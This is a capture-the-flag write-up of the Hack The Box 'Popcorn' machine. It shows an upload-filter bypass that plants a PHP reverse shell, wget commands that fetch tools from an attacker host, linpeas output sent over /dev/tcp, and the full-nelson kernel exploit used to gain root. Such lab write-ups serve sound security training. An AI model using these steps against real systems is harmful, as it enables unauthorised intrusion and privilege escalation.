---
description: >-
  The moment you accept things as they are, you don’t need to hope anymore,
  because you realize where you are is kind of okay. - Jason Louv
icon: popcorn
---

# Hack The Box - Popcorn Writeup

As usual, we start off with a lazy nmap scan:

```
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.45.92 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-30 22:19 EDT
Nmap scan report for popcorn.htb (10.129.45.92)
Host is up (0.092s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.92 seconds
```

This is a web box, and as usual, we have 80 and 22 open. After adding popcorn.htb to my hosts file, we go check out the website:

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Looks like some kind of Torrent website. There is a login page, and a signup page. Let's go ahead and make an account:

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

We login and see some options:

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

The most obvious option of interest is the upload functionality:

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

We can see that this website utilizes php, so we will try uploaded a php shell. We will utilize pentestmonkeys reverse shell: [https://pentestmonkey.net/tools/web-shells/php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

When trying to upload the php file straight, it does not let us:

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

I tried many different variations, but the upload functionality seems very strict. I even tried tampering with a legitimate torrent a little bit, and it would not take it. So I grabbed a perfectly valid torrent file online and uploaded it:

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

After poking around a little, I find another interesting place to upload files. You can upload a screenshot for your torrent after uploading:

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

All I had to do was tinker with the content-type header, and it took it, no problem:

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

After refreshing the web page, nothing happened at first. However, after clicking on the "Image File Not Found" picture/button, it attempts to expand the "picture", and triggers our paylaod:

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444    
listening on [any] 4444 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.45.92] 57357
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 05:44:06 up  1:07,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

Let's run some linpeas. I want the color, so I pipe the contents back to my netcat:

```
www-data@popcorn:/var/www/.ssh$ wget http://10.10.16.5/linpeas.sh
wget http://10.10.16.5/linpeas.sh
--2025-05-31 06:05:18--  http://10.10.16.5/linpeas.sh
Connecting to 10.10.16.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840139 (820K) [text/x-sh]
Saving to: `linpeas.sh'

100%[======================================>] 840,139      527K/s   in 1.6s    

2025-05-31 06:05:20 (527 KB/s) - `linpeas.sh' saved [840139/840139]

www-data@popcorn:/var/www/.ssh$ echo $SHELL
echo $SHELL
/bin/sh
www-data@popcorn:/var/www/.ssh$ /bin/bash
/bin/bash
www-data@popcorn:/var/www/.ssh$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@popcorn:/var/www/.ssh$ ./linpeas.sh > /dev/tcp/10.10.16.5/4445
```

```
┌──(kali㉿kali)-[~/tools]
└─$ nc -nvlp 4445     
listening on [any] 4445 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.45.92] 41142



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

```

The output gives an insane amount of OS vulnerabilities, which it is likely vulnerable to multiple. I parsed it down to choose one that had a date labeled prior to the release of the box (2017), and landed on:

```
[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson                                                         

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Exposure: highly probable
   Tags: [ ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)} ],ubuntu=10.04{kernel:2.6.32-(21|24)-server}
   Download URL: http://vulnfactory.org/exploits/full-nelson.c
```

After grabbinb it, compiling on the box, and running it:

```
www-data@popcorn:/var/www/.ssh$ wget http://10.10.16.5/nelson.c
wget http://10.10.16.5/nelson.c
--2025-05-31 06:11:11--  http://10.10.16.5/nelson.c
Connecting to 10.10.16.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9124 (8.9K) [text/x-csrc]
Saving to: `nelson.c'

100%[======================================>] 9,124       --.-K/s   in 0.09s   

2025-05-31 06:11:12 (104 KB/s) - `nelson.c' saved [9124/9124]

www-data@popcorn:/var/www/.ssh$ chmod +x nelson.c
chmod +x nelson.c
www-data@popcorn:/var/www/.ssh$ gcc nelson.c -o nelson
gcc nelson.c -o nelson
www-data@popcorn:/var/www/.ssh$ ./nelson
./nelson
[*] Resolving kernel addresses...
 [+] Resolved econet_ioctl to 0xf841d280
 [+] Resolved econet_ops to 0xf841d360
 [+] Resolved commit_creds to 0xc01645d0
 [+] Resolved prepare_kernel_cred to 0xc01647d0
[*] Calculating target...
[*] Triggering payload...
[*] Got root!
# id
id
uid=0(root) gid=0(root)
# cat /root/flag.txt
cat /root/flag.txt
cat: /root/flag.txt: No such file or directory
# cd /root
ls
cd /root
ls
# root.txt
# cat root.txt
cat root.txt
7a95f77DEADBEEF31c73bb346a83ddf2
```

This was actually a very easy box. The upload bypass was not tricky, and privilege escalation was also very easy. However, I still find the easy boxes a lot of fun, as they can offer a good change of pace. They also get you to touch back on more basic skills that the more difficult boxes will likely not employ.
